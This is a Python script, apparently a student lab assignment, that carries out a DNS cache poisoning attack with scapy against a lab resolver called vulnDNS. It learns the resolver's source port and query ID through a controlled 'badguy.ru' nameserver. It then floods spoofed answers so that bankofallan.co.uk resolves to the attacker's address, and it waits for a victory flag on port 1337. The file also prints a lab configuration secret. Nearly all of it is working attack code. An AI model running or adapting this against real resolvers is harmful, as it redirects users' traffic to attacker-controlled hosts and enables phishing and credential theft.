#! /usr/bin/env python2
# -*- coding: utf-8 -*-
"""Venom DNS server attacker

This program can carry a successful DNS cache poisoning attack versus vulnDNS server.
The program needs Python 2.7> and root permissions to work properly and it has been tested just on Debian Linux OS.
To start the program please first install scapy with this command:

(sudo) pip install -r ./requirements.txt # the sudo depends on your OS
(sudo) python venom.py

"""
import string

from scapy import *
from scapy.config import conf
from scapy.packet import Raw
from scapy.route import *

from util import decode_dns_message

__author__ = "Andrea Lacava (1663286), Matteo Attenni (1655314), Ilaria Clemente (1836039)"
__credits__ = ["Andrea Lacava", "Matteo Attenni", "Ilaria Clemente"]
__license__ = "GPL"
__version__ = "1.1"
__email__ = "lacava.1663286@studenti.uniroma1.it, attenni.1655314@studenti.uniroma1.it, " \
            "clemente.1836039@studenti.uniroma1.it"
__status__ = "Production"

import sys
import threading
import time

from socket import *
from random import *

from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import send, sniff

# print headers just for debug and info
DNS_ROUTINE_HEADER = "[DNS_SERVER_ROUTINE]: "
BITE_THE_RAT_HEADER = "[BITE_THE_RAT]: "
LISTENER_HEADER = "[LISTENER_FLAG]: "
MAIN_HEADER = "[MAIN]: "

TARGET_IP = "192.168.56.101"  # vulnDNS's IP

# DNS endpoint IP of badguy.ru (also present on config.json)
BAD_DNS_SERVER_IP = "192.168.56.1"
# DNS endpoint port of badguy.ru (also present on config.json)
BAD_DNS_SERVER_PORT = 55553

# secret in config.json is IAmRat2019!

# please see the attached report to know how we manage to find the query ID
SPOOFED_DNS = "10.0.0.1"
URL_TO_POISON = "bankofallan.co.uk"
DNS_URL_BADGUY = "badguy.ru"

BADGUY_REDIRECT_IP = "192.168.56.1"
VICTORY_FLAG_PORT = 1337
BUFFER_SIZE = 8192

NUMBER_OF_PACKETS = 2000  # number of packets per attempt
# if the attack continue to fail, please increase, it is set to lower numbers just for debug
NUMBER_OF_ATTEMPTS = 250
# seconds of delay to synchronize in a naive way the operations
TIME_SLEEP_SECONDS = 0.5

# these parameters will be updated and shared by threads
ATTACK_GOING_ON = True
TARGET_PORT = 0
STARTING_QUERY_ID = 0


# please note that there'are some magic number not really useful for the final purpose of the attack
# in fact the standard DNS port is always referred with number 53 and the ttl is always a very large value

def dns_server_routine():
    """DNS server routine

    This function simulate a DNS server for "badguy.ru". Its main purposes are:
    - receiving and parsing DNS recursive requests from vulnDNS in order to get source port and starting query id
    - answer to vulnDNS (not really necessary for the attack, but hey! It's unpolite to not answer back!)

    """
    print(DNS_ROUTINE_HEADER + "Starting routine of DNS sniffer of badguy.ru")
    global ATTACK_GOING_ON
    global STARTING_QUERY_ID
    global TARGET_PORT

    while ATTACK_GOING_ON:
        a = sniff(filter="udp port " +
                  str(BAD_DNS_SERVER_PORT), count=1, promisc=1)
        if a[0].haslayer(IP) and a[0].haslayer(UDP):
            # print(DNS_ROUTINE_HEADER + "Packet sniffed, analyzing...")
            sniffed_packet = a[0]
            sniffed_ip = sniffed_packet.getlayer(IP)
            if sniffed_ip.src != TARGET_IP:
                continue
            target_port = sniffed_ip.sport
            # print(DNS_ROUTINE_HEADER + "Sniffed ip src " + str(sniffed_ip.src)
            #      + ", src port: " + str(sniffed_ip.sport))
            # print(DNS_ROUTINE_HEADER + "Dst ip:" + str(sniffed_ip.dst) + ", dest port:" + str(sniffed_ip.dport))
            if TARGET_PORT != target_port:
                print(DNS_ROUTINE_HEADER + "New target port is \"" +
                      str(target_port) + "\".")
                TARGET_PORT = target_port
            if sniffed_packet.haslayer(DNS):
                first_query_id = sniffed_packet.getlayer(DNS).id
            else:
                try:
                    first_query_id = decode_dns_message(
                        a[0].getlayer(Raw).load)["id"]
                except Exception:  # this is usually raised only when attack is failed
                    print(
                        DNS_ROUTINE_HEADER + "Packet not decoded, probably attack failure! Skipping on...")
                    continue

            # print(DNS_ROUTINE_HEADER + "Query id updated: \"" + str(first_query_id) + "\".")
            STARTING_QUERY_ID = first_query_id

            # we just reply here to the request
            dns_record_request = DNSQR(qname=DNS_URL_BADGUY)
            dns_answer = DNSRR(rrname=DNS_URL_BADGUY, type="A",
                               ttl=5600, rclass="IN", rdata="192.168.56.1")
            # print(DNS_ROUTINE_HEADER + "Sending badguy.ru DNS response...")
            res_packet = (IP(src=BADGUY_REDIRECT_IP, dst=TARGET_IP) /
                          UDP(dport=target_port) /
                          DNS(id=first_query_id, qr=1, aa=1, ra=0, rcode=0, qd=dns_record_request, an=dns_answer))
            send(res_packet, verbose=0)
        # print(DNS_ROUTINE_HEADER + "Response sent!")
    print(DNS_ROUTINE_HEADER + "It seems attack is finished, bye bye!")


def randomize_url(url_length=3):
    """Create a random URL to attach to the URL_TO_POISON to simulate the request of subdomain

    Parameters
    ----------
    url_length : int, optional
        The length of the subdomain (default is 3)

    Returns
    -------
    str
        random string generated with length url_length
    """
    letters = string.ascii_lowercase
    return "".join(choice(letters) for i in range(url_length)) + "."


def random_query_id(modifier=0):
    """Create a random query id

    Parameters
    ----------
    modifier : int, optional
        Just a simple range modifier (default is 0)

    Returns
    -------
    int
        random query id
    """
    return randint(1, modifier) % 65536  # 16 bit maximum delimiter of query_id's DNS field


def bite_the_rat():
    """ BiteTheRat attack function.

    This function is the main core of the program:
        1) Sends the DNS requests for badguy.ru to get query id and source port to vulnDNS
        2) Creates fake answer packets
        3) Send the DNS request for bankofallan.co.uk to vulnDNS
        4) Attack with fake answers packets

    """
    global TARGET_PORT
    global STARTING_QUERY_ID
    global ATTACK_GOING_ON
    global NUMBER_OF_ATTEMPTS

    print(BITE_THE_RAT_HEADER + "Sleeping for " +
          str(TIME_SLEEP_SECONDS) + " seconds to allow DNS sniffer startup...")
    time.sleep(TIME_SLEEP_SECONDS)
    print(BITE_THE_RAT_HEADER + "We first send a request to " + TARGET_IP + " " +
          "asking for badguy.ru to get an initial query id and" + " port with our DNS with DNS server, " +
          "then we craft attack " +
          "packets, and we send a request and the fake responses.")
    # we need this request to get a get an updated value of query id
    first_dns_req = IP(dst=TARGET_IP) / UDP(dport=53) / DNS(id=random_query_id(25), rd=1,
                                                            qd=DNSQR(qname=DNS_URL_BADGUY))
    send(first_dns_req, verbose=0)
    time.sleep(TIME_SLEEP_SECONDS)

    print(BITE_THE_RAT_HEADER + "Starting attack socket...")
    # the send() function of scapy is not enough fast so we use the lower level
    sock = conf.L3socket()
    payloaded_packets = []
    print(BITE_THE_RAT_HEADER + "Socket started!")
    random_url = randomize_url(randint(1, 3)) + URL_TO_POISON
    print(BITE_THE_RAT_HEADER +
          "Creating attack packets with url:\"" + random_url + "\"...")
    dns_record_req = DNSQR(qname=random_url)
    dns_authoritative_answer = DNSRR(
        rrname=random_url, type="A", ttl=10000, rclass="IN", rdata="4.4.4.4")
    dns_additional_answer = DNSRR(
        rrname=URL_TO_POISON, rdata=BADGUY_REDIRECT_IP, type="A", rclass="IN", ttl=10000)

    # id is random but it not necessary
    dns_malicious_req = IP(dst=TARGET_IP) / UDP(dport=53) / \
        DNS(id=random_query_id(25), rd=1, qd=dns_record_req)

    for query_id in range(65536):
        # print(BITE_THE_RAT_HEADER + "query id packet: " + str(query_id))
        attack_res_packet = (IP(src=SPOOFED_DNS, dst=TARGET_IP) /
                             UDP(dport=TARGET_PORT) /
                             DNS(id=query_id, qd=dns_record_req, qr=1, aa=1, ra=0, ar=dns_additional_answer,
                                 an=dns_authoritative_answer))
        payloaded_packets.append(attack_res_packet)
    # wrpcap('attack_example.pcap', payloaded_packets[0]) # just used for the final relation
    print(BITE_THE_RAT_HEADER +
          "Attack packets created! Sending request and fake responses...")
    j = 1
    while ATTACK_GOING_ON:
        # print(BITE_THE_RAT_HEADER + "Target port is \"" + str(TARGET_PORT) + "\", starting query id is \"" +
        #      str(STARTING_QUERY_ID) + "\".")

        # since we've to guess the new query id we define an incremental pseudo random generator
        guessed_query_id = STARTING_QUERY_ID + random_query_id(10)
        sock.send(dns_malicious_req)
        for i in range(NUMBER_OF_PACKETS):
            guessed_query_id = (guessed_query_id + i) % 65536
            sock.send(payloaded_packets[guessed_query_id])
            # print("Starting query id: " + str(STARTING_QUERY_ID) + ", guessed query id: " + str(guessed_query_id))

        if j > NUMBER_OF_ATTEMPTS:
            ATTACK_GOING_ON = False
            print(BITE_THE_RAT_HEADER +
                  "Number of attempts reached! Attack failed :(")
            print(BITE_THE_RAT_HEADER +
                  "We send an UDP packet to kill the listener and the DNS servers")
            death_flag_pkt = (IP(src=TARGET_IP, dst=BADGUY_REDIRECT_IP) /
                              UDP(sport=randint(5000, 6000), dport=VICTORY_FLAG_PORT) /
                              Raw(load="Attack failed!"))

            sock.send(death_flag_pkt)
            death_flag_pkt = (IP(src=TARGET_IP, dst=BADGUY_REDIRECT_IP) /
                              UDP(sport=randint(5000, 6000), dport=BAD_DNS_SERVER_PORT) /
                              Raw(load="Attack failed!"))
            sock.send(death_flag_pkt)
        else:
            print(BITE_THE_RAT_HEADER + "Attempt " + str(j) + "/" + str(
                NUMBER_OF_ATTEMPTS) + " failed, updating id.")
            # we made another request asking for badguy to update the query id
            first_dns_req = (IP(dst=TARGET_IP) / UDP(dport=53) /
                             DNS(id=random_query_id(10), rd=1, qd=DNSQR(qname=DNS_URL_BADGUY)))
            send(first_dns_req, verbose=0)
            time.sleep(TIME_SLEEP_SECONDS)
            j += 1
    print(BITE_THE_RAT_HEADER + "Attack finished, closing socket...")
    sock.close()


def flag_victory_listener():
    """
    This function just listens on port 1337 the Victory flag.

    """
    sock = socket(AF_INET,  # Internet
                  SOCK_DGRAM)  # UDP
    print(LISTENER_HEADER + "Starting server...")
    sock.bind(("", VICTORY_FLAG_PORT))
    print(LISTENER_HEADER + "done!")
    global ATTACK_GOING_ON

    while ATTACK_GOING_ON:
        try:
            data, addr = sock.recvfrom(BUFFER_SIZE)
            print(LISTENER_HEADER + "Received from \"" +
                  addr[0] + "\": " + str(data))
            ATTACK_GOING_ON = False
        except KeyboardInterrupt:
            print(LISTENER_HEADER + "Closing socket to exit gracefully...")
            sock.close()
            print(LISTENER_HEADER + "Socket closed, bye bye!")
            sys.exit(0)

    ATTACK_GOING_ON = False
    print(LISTENER_HEADER + "Attack finished, closing socket to exit gracefully...")
    sock.close()
    print(LISTENER_HEADER + "Socket closed, bye bye!")


def main():
    """
    The main() will just launch the threads

    """
    print(MAIN_HEADER + "Initializing attack...")
    flag_victory_thread = threading.Thread(
        name="flag_victory_thread", target=flag_victory_listener)
    print(MAIN_HEADER + "Listener thread created!")
    print(MAIN_HEADER + "Starting listener to get victory flag...")
    flag_victory_thread.start()
    print(MAIN_HEADER + "Starting DNS of badguy to get port and initial query id...")
    dns_badguy_thread = threading.Thread(
        name="dns_badguy_thread", target=dns_server_routine)
    bite_rat_thread = threading.Thread(
        name="bite_rat_thread", target=bite_the_rat)
    dns_badguy_thread.start()
    bite_rat_thread.start()

    bite_rat_thread.join()
    dns_badguy_thread.join()
    flag_victory_thread.join()


if __name__ == "__main__":
    main()
